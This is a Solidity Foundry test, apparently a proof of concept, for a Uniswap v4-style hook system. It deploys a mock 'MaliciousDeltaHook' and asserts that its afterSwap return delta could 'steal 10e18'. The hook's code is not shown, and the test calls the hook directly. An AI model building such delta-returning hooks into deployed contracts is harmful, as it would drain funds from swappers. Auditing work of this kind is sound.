// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;
import "forge-std/Test.sol";
import {PoolKey} from "../src/types/PoolKey.sol";
import {Currency} from "../src/types/Currency.sol";
import {Hooks} from "../src/libraries/Hooks.sol";
import {TickMath} from "../src/libraries/TickMath.sol";
import {MaliciousDeltaHook} from "./mocks/MaliciousDeltaHook.sol";
import {IHooks} from "../src/interfaces/IHooks.sol";
import {SwapParams} from "../src/types/PoolOperation.sol";
import {BalanceDelta} from "../src/types/BalanceDelta.sol";

contract POC is Test {
    MaliciousDeltaHook hook;
    function setUp() public {
        uint160 flags = uint160(Hooks.AFTER_SWAP_FLAG | Hooks.AFTER_SWAP_RETURNS_DELTA_FLAG);
        address hookAddr = address(flags);
        deployCodeTo("MaliciousDeltaHook.sol:MaliciousDeltaHook", "", hookAddr);
        hook = MaliciousDeltaHook(hookAddr);
    }
    function test_afterSwapReturnDelta() public {
        PoolKey memory key = PoolKey(Currency.wrap(address(0x1)), Currency.wrap(address(0x2)), 3000, 60, IHooks(address(hook)));
        SwapParams memory params = SwapParams(false, -0.1e18, TickMath.MAX_SQRT_PRICE - 1);
        BalanceDelta empty = BalanceDelta.wrap(0);
        (bytes4 sel, int128 delta) = hook.afterSwap(address(this), key, params, empty, "");
        console.log("Selector ok");
        console.logInt(delta);
        assertEq(delta, int128(10e18), "Hook can steal 10e18 via return delta");
        assertEq(sel, IHooks.afterSwap.selector);
    }
}